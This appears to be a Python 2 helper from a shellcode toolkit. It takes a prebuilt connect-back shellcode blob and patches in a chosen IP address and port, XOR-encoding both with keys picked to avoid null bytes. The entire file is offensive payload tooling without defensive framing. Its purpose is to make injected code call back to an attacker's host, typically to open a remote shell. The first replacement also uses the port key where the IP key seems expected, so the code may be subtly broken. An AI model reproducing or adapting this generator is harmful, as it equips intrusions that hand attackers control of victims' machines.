from connect_shellcode import connect_shellcode


def connect(ip, port):
	import struct
	import socket
	ip = socket.inet_aton(ip)
	port = struct.pack("!H", port)
	family = struct.pack("<H", 2)
	family_port = family+port
	ip_enc = ""
	ip_key = ""
	for m in ip:
		k = 0xFF
		if(ord(m) == k):
			k = 0xEE
		ip_key += chr(k)
		ip_enc += chr(ord(m) ^ k)
	fp_enc = ""
	fp_key = ""
	for m in family_port:
		k = 0xFF
		if(ord(m) == k):
			k = 0xEE
		fp_key += chr(k)
		fp_enc += chr(ord(m) ^ k)
	return connect_shellcode.replace("\xb8\x6e\x11\x11\x10\x35\x11\x11\x11\x11", "\xb8" + ip_enc + "\x35" + fp_key).replace("\xb8\x13\x11\x15\xc3\x35\x11\x11\x11\x11", "\xb8" + fp_enc + "\x35" + fp_key)

